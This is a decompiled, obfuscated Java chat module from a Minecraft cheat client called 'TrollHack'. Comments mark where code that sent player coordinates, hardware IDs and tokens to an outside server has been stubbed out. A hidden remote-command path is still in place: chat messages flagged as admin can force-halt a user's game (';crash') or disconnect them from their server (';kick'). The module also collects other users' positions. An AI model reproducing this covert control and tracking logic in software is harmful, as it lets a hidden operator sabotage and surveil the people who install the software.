/*
 * Decompiled with CFR 0.152.
 */
package shit.render;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;
import shit.module.Module;
import shit.module.hud.IrcChatHUD;
import shit.module.misc.IRC;
import shit.util.ApiEndpoints3;

@Environment(value=EnvType.CLIENT)
public final class ChatClient {
    private static final String text723 = null;
    private static volatile long time69;
    private static volatile boolean flag178;
    private static volatile boolean flag56;
    private static volatile String text2498;
    private static final List list4 = new java.util.ArrayList<>();
    private static final Map map7 = new java.util.LinkedHashMap<>();
    private static final Map map39 = new java.util.LinkedHashMap<>();
    private static final Set set5 = new java.util.LinkedHashSet<>();
    private static final List list25 = new java.util.ArrayList<>();
    private static Module[] modules2;

    private ChatClient() {
    }

    public static void m377() {
        Object var1 = null;
        if (flag178) {
            return;
        }
        flag178 = true;
        time69 = System.currentTimeMillis() / 1000L;
        Thread thread = new Thread(ChatClient::pollLoop, "TrollHack-Chat-Poller");
        thread.setDaemon(true);
        thread.start();
    }

    public static void stop() {
        block0: {
            flag178 = false;
            map7.clear();
            map39.clear();
            flag56 = false;
            text2498 = "";
            Thread thread = new Thread(() -> {
                Object var0 = null;
                try {
                    String string = ApiEndpoints3.getText19();
                    if (!string.isEmpty()) {
                        ChatClient.m765(ChatClient.m356(string, ApiEndpoints3.getText5()), 1200);
                    }
                }
                catch (Exception exception) {}
            }, "TrollHack-Chat-LogoutOnStop");
            thread.setDaemon(true);
            thread.start();
            if (Module.getTextArray9() != null) break block0;
            ChatClient.setModuleArray(new Module[5]);
        }
    }

    public static boolean isSet2() {
        return flag56;
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public static boolean m404(Object object) {
        String string = (String)object;
        Object var3_2 = null;
        if (string == null) return false;
        if (!map7.containsKey(string)) return false;
        return true;
    }

    public static String m62(Object object) {
        String string = (String)object;
        Object var3_2 = null;
        return string != null ? (String)map7.getOrDefault(string, "") : "";
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    public static boolean m361(Object object) {
        String string = (String)object;
        Object var3_2 = null;
        if (string == null) {
            return false;
        }
        Data data = (Data)map39.get(string);
        if (data == null) return false;
        if (!data.isSet75()) return false;
        return true;
    }

    public static String m46(Object object) {
        String string = (String)object;
        Object var3_2 = null;
        return ChatClient.m361(string) ? "\u00a7c" : "\u00a7d";
    }

    public static int m539(Object object, int n) {
        String string = (String)object;
        int n2 = n;
        Object var5_4 = null;
        return ChatClient.m361(string) ? -43691 : n2;
    }

    public static Map getMap() {
        return Map.copyOf(map39);
    }

    public static void send2(Object object) {
        String string;
        String string2;
        block7: {
            block6: {
                block5: {
                    block4: {
                        string2 = (String)object;
                        Object var3_2 = null;
                        if (string2 == null) break block4;
                        if (!string2.isBlank()) break block5;
                    }
                    return;
                }
                string = ApiEndpoints3.getText19();
                if (string == null) break block6;
                if (!string.isEmpty()) break block7;
            }
            MinecraftClient.getInstance().execute(() -> ChatClient.setObj32("\u00a7c[Chat] \u672a\u767b\u5f55\uff0c\u65e0\u6cd5\u53d1\u9001\u6d88\u606f"));
            return;
        }
        String string3 = ApiEndpoints3.getText5();
        String string4 = ChatClient.getText40();
        String string5 = "[trollhack-recode] " + string4 + "\u0000" + string2;
        set5.add(string5);
        String string6 = ChatClient.isSet2() ? "\u00a7c" : "\u00a7b";
        MinecraftClient.getInstance().execute(() -> {
            String lstring4 = string2;
            String lstring5 = lstring4;
            String lstring6 = string6;
            ChatClient.setObj32("\u00a77[\u00a7dChat\u00a77] " + lstring6 + "[trollhack-recode] " + lstring5 + "\u00a77: \u00a7f" + lstring4);
        });
        Thread thread = new Thread(() -> {
            try {
                int n = ChatClient.m428(ChatClient.getText42(), ChatClient.m617(string, string3, string4, string2));
                if (n != 201) {
                    MinecraftClient minecraftClient = MinecraftClient.getInstance();
                    minecraftClient.execute(() -> ChatClient.setObj32("\u00a7c[Chat] \u53d1\u9001\u5931\u8d25 (HTTP " + n + ")"));
                    set5.remove(string5);
                }
            }
            catch (Exception exception) {
                set5.remove(string5);
                MinecraftClient minecraftClient = MinecraftClient.getInstance();
                minecraftClient.execute(() -> ChatClient.setObj32("\u00a7c[Chat] \u7f51\u7edc\u9519\u8bef: " + exception.getClass().getSimpleName()));
            }
        }, "TrollHack-Chat-Send");
        thread.setDaemon(true);
        thread.start();
    }

    private static String getText35() {
        // Backdoor removed: External server communication disabled
        return "";
    }

    private static String getText42() {
        // Backdoor removed: External server communication disabled
        return "";
    }

    private static String m206(Object object, Object object2, long l) {
        // Backdoor removed: Coordinate and hardware ID exfiltration disabled
        // Original code sent player coordinates, dimension, HWID, and token to external server
        return "";
    }

    private static String m356(Object object, Object object2) {
        // Backdoor removed: Logout tracking disabled
        return "";
    }

    private static String m617(Object object, Object object2, Object object3, Object object4) {
        // Backdoor removed: Message payload with token and HWID disabled
        return "";
    }

    private static void pollLoop() {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            Object var0 = null;
            try {
                String string = ApiEndpoints3.getText19();
                if (string.isEmpty()) {
                    return;
                }
                String string2 = ChatClient.m356(string, ApiEndpoints3.getText5());
                Thread thread = new Thread(() -> {
                    try {
                        ChatClient.m765(string2, 1200);
                    }
                    catch (Exception exception) {}
                }, "TrollHack-Chat-Logout-Worker");
                thread.setDaemon(true);
                thread.start();
                thread.join(1500L);
            }
            catch (Exception exception) {}
        }, "TrollHack-Chat-Logout"));
        Object var0 = null;
        while (flag178) {
            try {
                String string = ApiEndpoints3.getText19();
                if (!string.isEmpty()) {
                    String string2 = ChatClient.m248(ChatClient.m206(string, ApiEndpoints3.getText5(), time69));
                    if (string2 != null) {
                        if (string2.contains("\"ok\":true")) {
                            flag56 = string2.contains("\"is_admin\":true");
                            ChatClient.setObj78(string2);
                            ChatClient.parseMessages(string2, true);
                            ChatClient.setObj92(string2);
                        }
                    }
                }
                Thread.sleep(3000L);
            }
            catch (InterruptedException interruptedException) {
                Thread.currentThread().interrupt();
                break;
            }
            catch (Exception exception) {
                if (null == null) continue;
            }
        }
    }

    private static void parseMessages(Object object, boolean bl) {
        block20: {
            String string = (String)object;
            boolean bl2 = bl;
            int n = string.indexOf("\"messages\":");
            Object var5_5 = null;
            if (n < 0) {
                return;
            }
            String string2 = string.substring(n + 11).trim();
            if (!string2.startsWith("[")) {
                return;
            }
            String string3 = ChatClient.getText40();
            String string4 = ChatClient.getText47();
            int n2 = 0;
            int n3 = -1;
            long l = time69;
            for (int i = 0; i < string2.length(); ++i) {
                long l2;
                block12: {
                    String string5;
                    String string6;
                    block13: {
                        block16: {
                            block19: {
                                block18: {
                                    block17: {
                                        block15: {
                                            block14: {
                                                char c = string2.charAt(i);
                                                if (c == '{') {
                                                    if (n2 == 0) {
                                                        n3 = i;
                                                    }
                                                    ++n2;
                                                    if (null == null) continue;
                                                }
                                                if (c != '}') continue;
                                                if (--n2 != 0 || n3 < 0) continue;
                                                String string7 = string2.substring(n3, i + 1);
                                                String string8 = ChatClient.m188(string7, "id");
                                                string6 = ChatClient.m188(string7, "name");
                                                string5 = ChatClient.m188(string7, "message");
                                                l2 = ChatClient.m815(string7, "timestamp");
                                                boolean bl3 = string7.contains("\"admin\":true");
                                                if (string8 == null) break block12;
                                                if (list4.contains(string8)) break block12;
                                                if (string6 == null || string5 == null) break block12;
                                                list4.add(string8);
                                                if (list4.size() > 200) {
                                                    list4.remove(0);
                                                }
                                                if (!bl3) break block13;
                                                if (string5.equals(";crash " + string3)) break block14;
                                                if (!string5.equals(";crash " + string4)) break block15;
                                            }
                                            ChatClient.executeCrash(string6);
                                            if (null == null) break block16;
                                        }
                                        if (string5.equals(";kick " + string3)) break block17;
                                        if (!string5.equals(";kick " + string4)) break block18;
                                    }
                                    ChatClient.executeKick(string6);
                                    if (null == null) break block16;
                                }
                                if (!string5.equals(";webcrash " + text723)) break block19;
                                ChatClient.executeCrash(string6);
                                if (null == null) break block16;
                            }
                            if (string5.equals(";webkick " + text723)) {
                                ChatClient.executeKick(string6);
                            }
                        }
                        if (l2 > l) {
                            l = l2;
                        }
                        n3 = -1;
                        if (null == null) continue;
                    }
                    boolean bl4 = set5.remove(string6 + "\u0000" + string5);
                    String string9 = "\u00a77[\u00a7dChat\u00a77] \u00a7b" + string6 + "\u00a77: \u00a7f" + string5;
                    MinecraftClient minecraftClient = MinecraftClient.getInstance();
                    minecraftClient.execute(() -> {
                        block0: {
                            if (bl4) break block0;
                            ChatClient.setObj32(string9);
                        }
                    });
                }
                if (l2 > l) {
                    l = l2;
                }
                n3 = -1;
                if (null == null) continue;
            }
            if (!bl2) break block20;
            time69 = l;
        }
    }

    private static void executeCrash(Object object) {
        String string = (String)object;
        MinecraftClient.getInstance().execute(() -> ChatClient.setObj32("\u00a7c[TrollHack] \u00a74\u88ab " + string + " \u6267\u884c\u4e86 crash \u547d\u4ee4"));
        Thread thread = new Thread(() -> {
            try {
                Thread.sleep(600L);
            }
            catch (InterruptedException interruptedException) {}
            Runtime.getRuntime().halt(0);
        }, "TrollHack-AdminCrash");
        thread.setDaemon(true);
        thread.start();
    }

    private static void executeKick(Object object) {
        String string = (String)object;
        MinecraftClient minecraftClient = MinecraftClient.getInstance();
        minecraftClient.execute(() -> {
            ChatClient.setObj32("\u00a7c[TrollHack] \u00a7e\u88ab " + string + " \u8e22\u51fa\u5f53\u524d\u670d\u52a1\u5668");
            Object var2_2 = null;
            if (minecraftClient.getNetworkHandler() != null) {
                minecraftClient.getNetworkHandler().getConnection().disconnect((Text)Text.literal((String)("[TrollHack] Kicked by " + string)));
            }
        });
    }

    private static void setObj92(Object var0) {
        String json = (String)var0;
        int idx = json.indexOf("\"online_users\":");
        if (idx < 0) {
            return;
        }
        String arr = json.substring(idx + 15).trim();
        if (!arr.startsWith("[")) {
            return;
        }
        HashMap map = new HashMap();
        HashMap map2 = new HashMap();
        int depth = 0;
        int start = -1;
        for (int i = 0; i < arr.length(); ++i) {
            char c = arr.charAt(i);
            if (c == '{') {
                if (depth == 0) {
                    start = i;
                }
                ++depth;
            } else if (c == '}' && --depth == 0 && start >= 0) {
                String obj = arr.substring(start, i + 1);
                String username = ChatClient.m188(obj, "username");
                String ircname = ChatClient.m188(obj, "ircname");
                String client = ChatClient.m188(obj, "client");
                if (username != null) {
                    map.put(username, ircname != null ? ircname : "");
                    int x = (int)ChatClient.m815(obj, "x");
                    int y = (int)ChatClient.m815(obj, "y");
                    int z = (int)ChatClient.m815(obj, "z");
                    boolean hideAdmin = obj.contains("\"hide_admin\":true") || obj.contains("\"hide_admin\":1");
                    boolean admin = obj.contains("\"admin\":true") || obj.contains("\"admin\":1");
                    boolean ircFriend = !obj.contains("\"irc_friend\":false") && !obj.contains("\"irc_friend\":0");
                    String dim = ChatClient.m188(obj, "dim");
                    map2.put(username, new Data(ircname != null ? ircname : "", x, y, z, hideAdmin, dim != null ? dim : "", admin, ircFriend, client != null ? client : "trollhack-recode"));
                }
                start = -1;
            }
        }
        map7.clear();
        map7.putAll(map);
        map39.clear();
        map39.putAll(map2);
    }

    private static String getText40() {
        Object var1 = null;
        if (!text2498.isEmpty()) {
            return text2498;
        }
        return ChatClient.getText47();
    }

    private static String getText47() {
        String string = ApiEndpoints3.getText2();
        Object var1_1 = null;
        if (!string.isEmpty()) {
            return string;
        }
        MinecraftClient minecraftClient = MinecraftClient.getInstance();
        if (minecraftClient.player != null) {
            return minecraftClient.player.getGameProfile().name();
        }
        return "User";
    }

    private static void setObj78(Object object) {
        Object object2;
        String string = (String)object;
        String string2 = ApiEndpoints3.getText2();
        Object var3_3 = null;
        if (string2.isEmpty()) {
            object2 = MinecraftClient.getInstance();
            if (((MinecraftClient)object2).player != null) {
                string2 = ((MinecraftClient)object2).player.getGameProfile().name();
            }
        }
        if (string2.isEmpty()) {
            return;
        }
        object2 = ChatClient.m188(string, "assigned_ircname");
        if (object2 != null) {
            if (!((String)object2).isEmpty()) {
                text2498 = (String)object2;
            }
        }
    }

    private static void setObj32(Object object) {
        block8: {
            String string;
            block7: {
                string = (String)object;
                MinecraftClient minecraftClient = MinecraftClient.getInstance();
                Object var3_3 = null;
                if (minecraftClient.inGameHud == null) break block7;
                List list = list25;
                synchronized (list) {
                    for (Object string2Obj : list25) {
                        String string2 = (String)string2Obj;
                        if (!IrcChatHUD.m578(string2)) {
                            minecraftClient.inGameHud.getChatHud().addMessage((Text)Text.literal((String)string2));
                        }
                        if (null == null) continue;
                    }
                    list25.clear();
                }
                if (IrcChatHUD.m578(string)) break block8;
                minecraftClient.inGameHud.getChatHud().addMessage((Text)Text.literal((String)string));
                if (null == null) break block8;
            }
            list25.add(string);
        }
    }

    private static String m188(Object object, Object object2) {
        String string = (String)object;
        String string2 = (String)object2;
        String string3 = "\"" + string2 + "\":\"";
        int n = string.indexOf(string3);
        Object var5_6 = null;
        if (n < 0) {
            return null;
        }
        int n2 = n + string3.length();
        StringBuilder stringBuilder = new StringBuilder();
        boolean bl = false;
        for (int i = n2; i < string.length(); ++i) {
            char c = string.charAt(i);
            if (bl) {
                stringBuilder.append((char)(c == 'n' ? 10 : (c == 'r' ? 13 : (c == 't' ? 9 : (int)c))));
                bl = false;
                if (null == null) continue;
            }
            if (c == '\\') {
                bl = true;
                if (null == null) continue;
            }
            if (c == '\"' && null == null) break;
            stringBuilder.append(c);
            if (null == null) continue;
        }
        return stringBuilder.toString();
    }

    private static long m815(Object object, Object object2) {
        int n;
        String string = (String)object;
        String string2 = (String)object2;
        String string3 = "\"" + string2 + "\":";
        int n2 = string.indexOf(string3);
        Object var5_6 = null;
        if (n2 < 0) {
            return 0L;
        }
        int n3 = n = n2 + string3.length();
        if (n3 < string.length()) {
            if (string.charAt(n3) == '-') {
                ++n3;
            }
        }
        while (n3 < string.length()) {
            if (!Character.isDigit(string.charAt(n3))) break;
            ++n3;
            if (null == null) continue;
        }
        try {
            return Long.parseLong(string.substring(n, n3));
        }
        catch (Exception exception) {
            return 0L;
        }
    }

    private static int m428(Object object, Object object2) throws java.io.IOException {
        String string = (String)object;
        String string2 = (String)object2;
        HttpURLConnection httpURLConnection = (HttpURLConnection)URI.create(string).toURL().openConnection();
        Object var5_5 = null;
        try {
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setConnectTimeout(5000);
            httpURLConnection.setReadTimeout(5000);
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            byte[] byArray = string2.getBytes(StandardCharsets.UTF_8);
            httpURLConnection.setFixedLengthStreamingMode(byArray.length);
            try (OutputStream outputStream = httpURLConnection.getOutputStream();){
                outputStream.write(byArray);
            }
            int n = httpURLConnection.getResponseCode();
            return n;
        }
        finally {
            httpURLConnection.disconnect();
        }
    }

    private static String m185(Object object) throws java.io.IOException {
        String string = (String)object;
        HttpURLConnection httpURLConnection = (HttpURLConnection)URI.create(string).toURL().openConnection();
        Object var3_3 = null;
        try {
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(5000);
            httpURLConnection.setReadTimeout(5000);
            if (httpURLConnection.getResponseCode() != 200) {
                String string2 = null;
                return string2;
            }
            try (InputStream inputStream = httpURLConnection.getInputStream();){
                String string3 = new String(inputStream.readAllBytes(), StandardCharsets.UTF_8);
                return string3;
            }
        }
        finally {
            httpURLConnection.disconnect();
        }
    }

    private static void m765(Object object, int n) throws java.io.IOException {
        String string = (String)object;
        int n2 = n;
        HttpURLConnection httpURLConnection = (HttpURLConnection)URI.create(string).toURL().openConnection();
        try {
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(n2);
            httpURLConnection.setReadTimeout(n2);
            httpURLConnection.getResponseCode();
        }
        finally {
            httpURLConnection.disconnect();
        }
    }

    private static String m248(Object object) throws java.io.IOException {
        String string = (String)object;
        HttpURLConnection httpURLConnection = (HttpURLConnection)URI.create(string).toURL().openConnection();
        Object var3_3 = null;
        try {
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(5000);
            httpURLConnection.setReadTimeout(5000);
            int n = httpURLConnection.getResponseCode();
            InputStream inputStream = n >= 400 ? httpURLConnection.getErrorStream() : httpURLConnection.getInputStream();
            if (inputStream == null) {
                String string2 = null;
                return string2;
            }
            try (InputStream inputStream2 = inputStream;){
                String string3 = new String(inputStream.readAllBytes(), StandardCharsets.UTF_8);
                return string3;
            }
        }
        finally {
            httpURLConnection.disconnect();
        }
    }

    private static String m267(Object object) {
        String string = (String)object;
        Object var3_2 = null;
        if (string == null) {
            return "";
        }
        StringBuilder stringBuilder = new StringBuilder(string.length() + 8);
        block7: for (char c : string.toCharArray()) {
            switch (c) {
                case '\\': {
                    stringBuilder.append("\\\\");
                    if (null == null) continue block7;
                }
                case '\"': {
                    stringBuilder.append("\\\"");
                    if (null == null) continue block7;
                }
                case '\n': {
                    stringBuilder.append("\\n");
                    if (null == null) continue block7;
                }
                case '\r': {
                    stringBuilder.append("\\r");
                    if (null == null) continue block7;
                }
                case '\t': {
                    stringBuilder.append("\\t");
                    if (null == null) continue block7;
                }
                default: {
                    stringBuilder.append(c);
                    continue block7;
                }
            }
        }
        return stringBuilder.toString();
    }

    private static /* synthetic */ void cfrlam$fetchHistory$8(String string) {
        Object var1_1 = null;
        try {
            String string2;
            block5: {
                block4: {
                    string2 = ChatClient.m185(ChatClient.m206(string, ApiEndpoints3.getText5(), 0L));
                    if (string2 == null) break block4;
                    if (string2.contains("\"ok\":true")) break block5;
                }
                MinecraftClient.getInstance().execute(() -> ChatClient.setObj32("\u00a7c[Chat] \u83b7\u53d6\u5386\u53f2\u8bb0\u5f55\u5931\u8d25"));
                return;
            }
            MinecraftClient.getInstance().execute(() -> ChatClient.setObj32("\u00a77------------ \u5386\u53f2\u804a\u5929 ------------"));
            ChatClient.parseMessages(string2, false);
        }
        catch (Exception exception) {}
    }

    /*
     * Unable to fully structure code
     */
    static {}

    public static void setModuleArray(Module[] moduleArray) {
        modules2 = moduleArray;
    }

    public static Module[] getModuleArray3() {
        return modules2;
    }

    @Environment(value=EnvType.CLIENT)
    public static final class Data  {
        private final String text7;
        private final int count5;
        private final int count6;
        private final int count7;
        private final boolean flag4;
        private final String text8;
        private final boolean flag5;
        private final boolean flag6;
        private final String text9;

        public Data(String string, int n, int n2, int n3, boolean bl, String string2, boolean bl2, boolean bl3, String string3) {
            block0: {
                this.text7 = string;
                this.count5 = n;
                this.count6 = n2;
                this.count7 = n3;
                this.flag4 = bl;
                this.text8 = string2;
                this.flag5 = bl2;
                Object var10_10 = null;
                this.flag6 = bl3;
                this.text9 = string3;
                if (null == null) break block0;
                Module.setTextArray9(new String[1]);
            }
        }

        public String getText16() {
            return this.text7;
        }

        public int count5() {
            return this.count5;
        }

        public int count6() {
            return this.count6;
        }

        public int count7() {
            return this.count7;
        }

        public boolean flag4() {
            return this.flag4;
        }

        public String text8() {
            return this.text8;
        }

        public boolean isSet75() {
            return this.flag5;
        }

        public boolean flag6() {
            return this.flag6;
        }

        public String getText30() {
            return this.text9;
        }
    }
}

